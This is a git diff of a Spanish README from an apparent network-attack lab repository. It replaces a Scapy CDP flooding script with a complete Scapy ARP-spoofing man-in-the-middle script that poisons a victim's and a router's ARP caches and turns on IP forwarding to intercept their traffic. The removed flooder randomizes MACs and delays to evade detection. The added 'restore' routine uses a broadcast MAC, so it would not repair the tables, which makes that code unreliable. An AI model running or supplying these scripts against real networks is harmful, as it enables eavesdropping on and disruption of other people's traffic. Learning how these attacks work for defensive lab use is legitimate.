@@ -55,9 +55,9 @@ Las capturas incluidas en este repositorio documentan el proceso completo del la
  <img width="943" height="331" alt="image" src="https://github.com/user-attachments/assets/3b9a2936-b3b6-4118-967b-917abb1327ce" />
 
 ---
-# CDP Packet Generator
+# ARP Spoofing - Man in the Middle Attack
 
-Script de Python que utiliza Scapy para generar y enviar paquetes CDP (Cisco Discovery Protocol).
+Script de Python que utiliza Scapy para realizar ataques ARP Spoofing (MITM) interceptando tráfico entre una víctima y el router.
 
 ## Requisitos
 ```bash
@@ -66,120 +66,95 @@ pip install scapy
 
 ## Uso
 ```bash
-sudo python3 cdp_flooder.py
+sudo python3 ARP.py
 ```
 
 ## Código Fuente
 ```python
-from scapy.all import Ether, LLC, SNAP, Raw, sendp, RandMAC
-import struct
-import random
+from scapy.all import ARP, send
 import time
+import sys
+import os
 
-# ===============================
-# HECHO POR MR.J4VI MINYETE
-# ===============================
+victima_ip = "15.0.7.3"
+router_ip = "15.0.7.1"
+interface = "eth0"
 
-# Configuración
-DESTINO_MAC = "01:00:0c:cc:cc:cc"
-INTERFAZ_RED = "eth0"
-VERSION_CDP = 0x02
+def habilitar_ip_forward():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-def calcular_checksum_cdp(datos):
-    """Calcula el checksum para paquetes CDP"""
-    if len(datos) % 2:
-        datos += b'\x00'
-    
-    total = 0
-    for indice in range(0, len(datos), 2):
-        total += (datos[indice] << 8) + datos[indice + 1]
-    
-    total = (total >> 16) + (total & 0xFFFF)
-    total += (total >> 16)
-    
-    return (~total) & 0xFFFF
+def deshabilitar_ip_forward():
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
-def construir_tlv(tipo_tlv, data):
-    """Construye un campo TLV (Type-Length-Value)"""
-    longitud = len(data) + 4
-    return struct.pack("!HH", tipo_tlv, longitud) + data
+def spoof(target_ip, spoof_ip):
+    paquete = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
+    send(paquete, verbose=False)
 
-def fabricar_paquete_cdp():
-    """Genera el payload CDP con información aleatoria"""
-    dispositivo = f"SWITCH-{random.randint(1000, 9999)}".encode()
-    interfaz = b"FastEthernet0/24"
-    caps = struct.pack("!I", 0x01)
-    
-    # Construir payload CDP
-    payload = b''
-    payload += construir_tlv(0x0003, interfaz)      # TLV Port ID
-    payload += construir_tlv(0x0001, dispositivo)   # TLV Device ID
-    payload += construir_tlv(0x0004, caps)          # TLV Capabilities
-    
-    # Parámetros del encabezado
-    tiempo_vida = random.randint(100, 200)
-    cabecera_temp = struct.pack("!BBH", VERSION_CDP, tiempo_vida, 0x0000)
-    
-    # Calcular checksum
-    datos_completos = cabecera_temp + payload
-    checksum = calcular_checksum_cdp(datos_completos)
-    
-    # Retornar paquete CDP completo
-    cabecera_final = struct.pack("!BBH", VERSION_CDP, tiempo_vida, checksum)
-    return cabecera_final + payload
+def restaurar(destino_ip, origen_ip):
+    paquete = ARP(op=2, pdst=destino_ip, psrc=origen_ip, hwsrc="ff:ff:ff:ff:ff:ff")
+    send(paquete, count=5, verbose=False)
 
-def ejecutar_flood():
-    """Función principal de ejecución"""
-    print("[*] Iniciando envío de paquetes CDP...")
-    print(f"[*] Interfaz: {INTERFAZ_RED}")
-    print("[*] Presiona Ctrl+C para detener\n")
+try:
+    print("[*] Activando IP Forwarding")
+    habilitar_ip_forward()
     
-    contador = 0
-    
-    try:
-        while True:
-            # Crear payload CDP
-            datos_cdp = fabricar_paquete_cdp()
-            
-            # Construir paquete completo
-            frame = (
-                Ether(src=RandMAC(), dst=DESTINO_MAC) /
-                LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
-                SNAP(OUI=0x00000c, code=0x2000) /
-                Raw(load=datos_cdp)
-            )
-            
-            # Enviar paquete
-            sendp(frame, iface=INTERFAZ_RED, verbose=False)
-            contador += 1
-            
-            if contador % 100 == 0:
-                print(f"[+] Paquetes enviados: {contador}")
-            
-            # Delay aleatorio
-            time.sleep(random.uniform(0.02, 0.08))
-            
-    except KeyboardInterrupt:
-        print(f"\n[!] Detenido. Total de paquetes enviados: {contador}")
-        print("[!] Finalizando...")
+    print("[*] Iniciando ARP Spoofing (CTRL+C para detener)")
+    while True:
+        # Envenenar a la victima
+        spoof(victima_ip, router_ip)
+        # Envenenar al router
+        spoof(router_ip, victima_ip)
+        time.sleep(2)
 
-if __name__ == "__main__":
-    ejecutar_flood()
+except KeyboardInterrupt:
+    print("\n[*] Restaurando tablas ARP...")
+    restaurar(victima_ip, router_ip)
+    restaurar(router_ip, victima_ip)
+    deshabilitar_ip_forward()
+    print("[*] Listo. Red restaurada.")
+    sys.exit(0)
 ```
 
 ## Características
 
-- ✅ Generación automática de paquetes CDP
-- ✅ MAC addresses aleatorias
-- ✅ Contador de paquetes enviados
-- ✅ Delays aleatorios para evitar detección
-- ✅ Manejo de interrupciones con Ctrl+C
+- 🎯 **ARP Spoofing (MITM)**: Intercepta tráfico entre víctima y router
+- 🔄 **Envenenamiento bidireccional**: Envenena tanto a la víctima como al router
+- ⚡ **IP Forwarding automático**: Habilita reenvío de paquetes
+- ✅ **Restauración automática**: Restaura tablas ARP al detener (Ctrl+C)
+- ✅ **Limpieza segura**: Deshabilita IP forwarding al finalizar
+- 📊 **Mensajes informativos**: Indica estado de cada fase
+- 🔧 **Configuración simple**: Variables fáciles de modificar
+
+## Configuración
+
+Edita las siguientes variables según tu red:
+```python
+victima_ip = "15.0.7.3"     # IP de la víctima
+router_ip = "15.0.7.1"      # IP del gateway/router
+interface = "eth0"           # Interfaz de red
+```
 
 ## Notas
 
-⚠️ **Advertencia**: Este script requiere privilegios de root para enviar paquetes raw.
+⚠️ **Advertencia**: Este script requiere privilegios de root para manipular tablas ARP.
 
-⚠️ **Uso responsable**: Utiliza este script únicamente en entornos de prueba autorizados.
+⚠️ **Uso responsable**: Utiliza este script únicamente en entornos de prueba autorizados y con fines educativos.
+
+⚠️ **Legal**: El uso no autorizado de este script puede ser ilegal. Asegúrate de tener permiso explícito.
+
+## Cómo funciona
+
+1. **Habilita IP Forwarding**: Permite que los paquetes pasen a través de tu máquina
+2. **Envenena ARP**: Envía paquetes ARP falsos a la víctima y al router
+3. **Intercepta tráfico**: Todo el tráfico pasa por tu máquina
+4. **Restaura al salir**: Limpia las tablas ARP y deshabilita forwarding
+
+## Detección
+
+Este ataque puede ser detectado mediante:
+- Monitoreo de tablas ARP
+- Detección de MAC duplicadas
+- IDS/IPS configurados
 
 ## Autor
 
